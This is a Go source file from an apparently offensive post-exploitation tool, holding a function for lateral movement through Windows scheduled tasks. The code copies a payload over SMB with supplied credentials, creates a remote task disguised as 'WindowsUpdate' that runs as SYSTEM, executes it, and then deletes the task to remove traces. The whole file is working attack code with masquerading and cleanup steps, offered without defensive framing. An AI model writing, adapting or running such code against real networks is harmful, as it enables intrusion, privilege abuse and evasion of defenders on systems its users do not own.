package lateral

import (
	"fmt"
	"path/filepath"
	"time"
)

// moveViaSchtasks 通过计划任务执行横向移动
func (lm *LateralMover) moveViaSchtasks(req MoveRequest) MoveResult {
	result := MoveResult{
		Method: MethodSchtasks,
		Target: getTargetAddress(req.Target),
	}

	if err := validateRequest(req); err != nil {
		result.Error = err
		result.Message = err.Error()
		return result
	}

	targetAddr := getTargetAddress(req.Target)
	credStr := buildCredString(req.Credentials)

	taskName := fmt.Sprintf("WindowsUpdate_%d", time.Now().Unix())

	var command string
	if req.PayloadPath != "" {
		err := lm.copyFileViaSMB(req.Target, req.Credentials, req.PayloadPath, "Windows\\Temp\\"+filepath.Base(req.PayloadPath))
		if err != nil {
			result.Success = false
			result.Error = err
			result.Message = fmt.Sprintf("Failed to copy payload: %v", err)
			return result
		}
		command = fmt.Sprintf("C:\\Windows\\Temp\\%s", filepath.Base(req.PayloadPath))
	} else {
		command = req.Command
	}

	createArgs := []string{
		"/create",
		"/tn", taskName,
		"/tr", command,
		"/sc", "once",
		"/st", "00:00",
		"/s", targetAddr,
		"/u", credStr,
		"/p", req.Credentials.Password,
		"/ru", "SYSTEM",
		"/f",
	}

	output, err := lm.execCommand("schtasks", createArgs...)
	if err != nil {
		result.Success = false
		result.Error = err
		result.Message = fmt.Sprintf("Failed to create scheduled task: %v", err)
		result.Output = sanitizeOutput(output)
		return result
	}

	runArgs := []string{
		"/run",
		"/tn", taskName,
		"/s", targetAddr,
		"/u", credStr,
		"/p", req.Credentials.Password,
	}

	output2, err := lm.execCommand("schtasks", runArgs...)
	if err != nil {
		result.Success = false
		result.Error = err
		result.Message = fmt.Sprintf("Failed to run scheduled task: %v", err)
		result.Output = sanitizeOutput(output + "\n" + output2)
		return result
	}

	time.Sleep(5 * time.Second)

	deleteArgs := []string{
		"/delete",
		"/tn", taskName,
		"/s", targetAddr,
		"/u", credStr,
		"/p", req.Credentials.Password,
		"/f",
	}

	output3, _ := lm.execCommand("schtasks", deleteArgs...)

	result.Success = true
	result.Message = "Task executed successfully via Schtasks"
	result.Output = sanitizeOutput(output + "\n" + output2 + "\n" + output3)

	return result
}
